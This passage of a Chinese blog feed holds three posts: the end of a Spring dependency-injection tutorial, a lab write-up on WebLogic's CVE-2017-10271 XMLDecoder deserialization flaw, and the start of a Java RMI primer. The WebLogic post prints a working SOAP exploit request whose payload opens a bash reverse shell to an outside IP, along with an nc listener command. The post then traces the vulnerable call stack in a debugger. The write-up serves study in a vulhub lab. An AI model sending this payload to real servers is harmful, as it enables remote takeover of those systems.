bean必须提供带参的构造函数。</p><p>对于构造函数的注入，配置文件可以有以下几种方式：</p><ul><li>按类型匹配入参</li><li>按索引匹配入参</li><li>联合使用类型和索引匹配入参</li><li>通过自身类型反射匹配入参</li></ul><p>我们看一下spring的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用spring管理对象的创建，还有对象的依赖关系 --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Mysql"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4MysqlImpl"</span>/&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Oracle"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4OracleImpl"</span>/&gt;</span>         </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userManager"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.manager.UserManagerImpl"</span>&gt;</span>    </span><br><span class="line">        <span class="comment">&lt;!-- (1)userManager使用了userDao，Ioc是自动创建相应的UserDao实现，都是由容器管理--&gt;</span>   </span><br><span class="line">        <span class="comment">&lt;!-- (2)在UserManager中提供构造函数，让spring将UserDao实现注入（DI）过来 --&gt;</span>    </span><br><span class="line">        <span class="comment">&lt;!-- (3)让spring管理我们对象的创建和依赖关系，必须将依赖关系配置到spring的核心配置文件中 --&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"userDao4Oracle"</span>/&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们再来看一下，构造器表示依赖关系的写法，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tgb.spring.dao.UserDao;    </span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserManagerImpl</span> <span class="keyword">implements</span> <span class="title">UserManager</span></span>&#123;   </span><br><span class="line">        <span class="keyword">private</span> UserDao userDao;    </span><br><span class="line">        <span class="comment">//使用构造方式赋值    </span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UserManagerImpl</span><span class="params">(UserDao userDao)</span> </span>&#123;    </span><br><span class="line">            <span class="keyword">this</span>.userDao = userDao;    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="meta">@Override</span>    </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String userName, String password)</span> </span>&#123;         </span><br><span class="line">            userDao.addUser(userName, password);    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>基于注解</strong></p><p>​    使用注解注入依赖对象不用再在代码中写依赖对象的setter方法或者该类的构造方法，并且不用再配置文件中配置大量的依赖对象，使代码更加简洁，清晰，易于维护。</p><p>在Spring IOC编程的实际开发中推荐使用注解的方式进行依赖注入。</p><ul><li>Autowired是自动注入，自动从spring的上下文找到合适的bean来注入</li><li>Resource用来指定名称注入</li><li>Qualifier和Autowired配合使用，指定bean的名称，如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Autowired  </span><br><span class="line">@Qualifier(&quot;userDAO&quot;)  </span><br><span class="line">private UserDAO userDAO;</span><br></pre></td></tr></table></figure><p>Spring容器的配置文件applicationContext.Xml文件中配置以下信息,是一个Spring配置文件的模板：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>   </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans   </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/beans/spring-beans-2.5.xsd  </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/context   </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/context/spring-context-2.5.xsd  </span></span></span><br><span class="line"><span class="tag"><span class="string">"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Spring配置隐式的注册了多个对注释进行解析的处理器,例如：</p><ul><li>AutowiredAnnotationBeanPostProcessor</li><li>CommonAnnotationBeanPostProcessor</li><li>PersistenceAnnotationBeanPostProcessor</li></ul><p>在配置文件中打开<a href="context:annotation-config">context:annotation-config</a>节点，告诉Spring容器可以用注解的方式注入依赖对象；其在配置文件中的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans&gt;&lt;context:annotation-config&gt;&lt;&#x2F;context:annotation-config&gt;&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure><p>在配置文件中配置bean对象，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"com.springtest.dao.impl.UserDAOImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userBiz"</span> <span class="attr">class</span>=<span class="string">"com.springtest.biz.impl.UserBizImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，在需要依赖注入的类中，声明一个依赖对象，不用生成该依赖对象的setter方法，并且为该对象添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserBizImpl</span> <span class="keyword">implements</span> <span class="title">UserBiz</span> </span>&#123;  </span><br><span class="line">   <span class="meta">@Resource</span>(name=<span class="string">"userDao"</span>)  </span><br><span class="line">   <span class="keyword">private</span> UserDAO userDao = <span class="keyword">null</span>; </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">          <span class="keyword">this</span>.userDao.addUser();  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Autowired默认按类型装配，@Resource默认按名称装配，当找不到与名称匹配的bean时，才会按类型装配。</p><h4 id="控制反转与依赖注入的区别"><a href="#控制反转与依赖注入的区别" class="headerlink" title="控制反转与依赖注入的区别"></a>控制反转与依赖注入的区别</h4><p>依赖注入和控制反转是对同一件事情的不同描述，</p><ul><li><p>依赖注入是从应用程序的角度在描述：应用程序依赖容器创建并注入它所需要的外部资源;</p></li><li><p>控制反转是从容器的角度在描述:容器控制应用程序，由容器反向的向应用程序注入应用程序所需要的外部资源。</p></li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://juejin.cn/post/6844903813753602056" target="_blank" rel="noopener">Spring注入Bean的几种方式 (juejin.cn)</a></p><p><a href="https://www.yisu.com/zixun/207582.html" target="_blank" rel="noopener">详解Spring中bean的几种注入方式 - 编程语言 - 亿速云 (yisu.com)</a></p><p><a href="https://www.w3cschool.cn/wkspring" target="_blank" rel="noopener">https://www.w3cschool.cn/wkspring</a></p><p><a href="https://blog.csdn.net/zhangzeyuaaa/article/details/22588459" target="_blank" rel="noopener">(15条消息) Spring Bean自动装配和注解注入_似水流年-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/104519509" target="_blank" rel="noopener">小白也看得懂的 Spring IoC 核心流程介绍 - 知乎 (zhihu.com)</a></p><p><a href="https://www.jianshu.com/p/6253726f239d" target="_blank" rel="noopener">Spring IOC原理总结 - 简书 (jianshu.com)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Spring–IOC&quot;&gt;&lt;a href=&quot;#Spring–IOC&quot; class=&quot;headerlink&quot; title=&quot;Spring–IOC&quot;&gt;&lt;/a&gt;Spring–IOC&lt;/h3&gt;&lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerli
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WebLogic XMLDecoder反序列化漏洞学习</title>
    <link href="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/</id>
    <published>2021-02-08T17:16:21.000Z</published>
    <updated>2021-08-20T04:51:04.670Z</updated>
    
    <content type="html"><![CDATA[<h3 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h3><p>​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。<br>​        Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。</p><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>一般使用的是10.3.6，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。</p><h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>​    weblogic “wls-wsat”组件在反序列化操作时使用了Oracle官方的JDK组件中”XMLDecoder”类进行XML反序列化操作引发了代码执行。</p><p>XMLDecoder类用于读取使用XMLEncoder创建的XML文档</p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135828.png" alt></p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135902.png" alt></p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135929.png" alt></p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>使用vulhub中的docker搭建复现环境，搭建环境可以参考<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/blob/m</span>aster<span class="regexp">/weblogic/</span>CVE-<span class="number">2017</span>-<span class="number">10271</span></span><br></pre></td></tr></table></figure><p>因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">version:</span> <span class="string">'2'</span><span class="string">services:</span>  </span><br><span class="line"><span class="string">weblogic:</span>    <span class="string">image:</span> vulhub/weblogic   </span><br><span class="line"><span class="string">ports:</span>     </span><br><span class="line">- <span class="string">"7001:7001"</span>     </span><br><span class="line">- <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206141422.png" alt></p><h4 id="IDEA远程调试"><a href="#IDEA远程调试" class="headerlink" title="IDEA远程调试"></a>IDEA远程调试</h4><p>,关于Weblogic的远程调试方法可以参考:</p><p><a href="https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md</a></p><p>使用idea打开拷贝出的项目文件，将项目中的/server/lib和modules这两个文件夹添加到library。</p><p>添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。</p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207180841.png" alt></p><p>然后我们在idea中设置remote debug，然后点击右上方的debug，出现如下字样，说明已经配置ok。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connected <span class="keyword">to</span> the target VM, addres<span class="variable">s:</span> <span class="string">'localhost:8453'</span>, transpor<span class="variable">t:</span> <span class="string">'socket'</span></span><br></pre></td></tr></table></figure><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207125332.png" alt></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先我们复现一下漏洞,在response中我们可以看到命令执行的调用栈。</p><p>首先我们开一个nc监听。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后直接拿vulhub上的poc打:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.111.134/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>反弹shell成功</p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207143625.png" alt></p><p>通过查看response中的xml数据，我们可以在&lt;ns2:frame /&gt;标签中看到调用栈。</p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207143937.png" alt></p><p>其中重要的调用栈有如下一些方法:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">processRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextTube-</span>&gt;<span class="selector-tag">readHeaderOld</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">receive</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextMapImpl-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextLocalMap-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.spi</span><span class="selector-class">.WorkContextEntryImpl-</span>&gt;<span class="selector-tag">readEntry</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextXmlInputAdapter-</span>&gt;<span class="selector-tag">readUTF</span></span><br></pre></td></tr></table></figure><p>我们接下来就根据上面复现得到的调用栈进行跟踪调试。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>根据poc找到问题出在<code>wls-wsat</code>，然后找到对应的wls-wsat.war包，打开后点击<code>web.xml</code>查看有哪些接口</p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206220029.png" alt></p><p>然后我们直接跟踪调用栈的第一个processRequest 方法。</p><h4 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h4><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207130022.png" alt></p><p>   这里的var1是传进来的XML数据。var3是soap头部解析的结果 不为空 于是 跟入readHeaderOld。</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextTube</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207130400.png" alt></p><p>在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，之后跟进receive()</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><p>var2获取一个WorkContextMapImpl实例，然后调用receiveRequest方法将var1值传入。</p><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207181022.png" alt></p><p>继续跟进receiveRequest()</p><h3 id="weblogic-workarea-WorkContextMapImpl"><a href="#weblogic-workarea-WorkContextMapImpl" class="headerlink" title="weblogic.workarea.WorkContextMapImpl"></a>weblogic.workarea.WorkContextMapImpl</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207181140.png" alt></p><p>将var1传到了receiveRequest()方法中，继续跟进</p><h3 id="weblogic-workarea-WorkContextLocalMap"><a href="#weblogic-workarea-WorkContextLocalMap" class="headerlink" title="weblogic.workarea.WorkContextLocalMap"></a>weblogic.workarea.WorkContextLocalMap</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131058.png" alt></p><p><code>WorkContextEntryImpl.readEntry(var1);</code>对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！</p><h3 id="weblogic-workarea-spi-WorkContextEntryImpl"><a href="#weblogic-workarea-spi-WorkContextEntryImpl" class="headerlink" title="weblogic.workarea.spi.WorkContextEntryImpl"></a>weblogic.workarea.spi.WorkContextEntryImpl</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131154.png" alt></p><p>继续跟进readUTF()：</p><h3 id="weblogic-wsee-workarea-WorkContextXmlInputAdapter"><a href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter" class="headerlink" title="weblogic.wsee.workarea.WorkContextXmlInputAdapter"></a>weblogic.wsee.workarea.WorkContextXmlInputAdapter</h3><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131435.png" alt></p><p>在这里就执行了this.xmlDecoder.readObject()，对XMLDecoder对象进行了反序列化，导致RCE。</p><h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207183630.png" alt></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p><p><a href="http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.jianshu.com/p/5493f63fd7a0" target="_blank" rel="noopener">https://www.jianshu.com/p/5493f63fd7a0</a></p><p><a href="https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md</a></p><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2017-10271/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;weblogic简介&quot;&gt;&lt;a href=&quot;#weblogic简介&quot; class=&quot;headerlink&quot; title=&quot;weblogic简介&quot;&gt;&lt;/a&gt;weblogic简介&lt;/h3&gt;&lt;p&gt;​        Weblogic是美国Oracle公司出品的一个应用服务器
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Java安全--RMI基础学习</title>
    <link href="https://shu1l.github.io/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/"/>
    <id>https://shu1l.github.io/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/</id>
    <published>2021-02-08T17:12:01.000Z</published>
    <updated>2021-08-20T14:07:47.218Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RMI定义"><a href="#RMI定义" class="headerlink" title="RMI定义"></a>RMI定义</h3><ul><li>Java远程调用，<strong>实现远程调用的应用程序编程接口</strong>。</li><li>RMI对象是通过<strong>序列化方式</strong>进行编码传输的。</li><li>Java程序远程调用另一台服务器的java对象。</li><li>RMI依赖的通信协议 JRMP。</li></ul><h3 id="RMI实现流程"><a href="#RMI实现流程" class="headerlink" title="RMI实现流程"></a>RMI实现流程</h3><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s" alt="img"></p><h4 id="1-创建接口"><a href="#1-创建接口" class="headerlink" title="1.创建接口"></a>1.创建接口</h4><p>在创建对象类之前，我们首先需要创建一个空接口，接口需要继承<code>java.rmi.Remote</code>。</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205736.png" alt></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public<span class="built_in"> interface </span>Services extends java.rmi.Remote &#123;</span><br><span class="line">    Object sendMessage(Message msg) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-实现接口"><a href="#2-实现接口" class="headerlink" title="2.实现接口"></a>2.实现接口</h4><p>接着我们实现这个接口，创建服务端对象类，实现的类必须继承UnicastRmeoteObject。</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205829.png" alt></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span 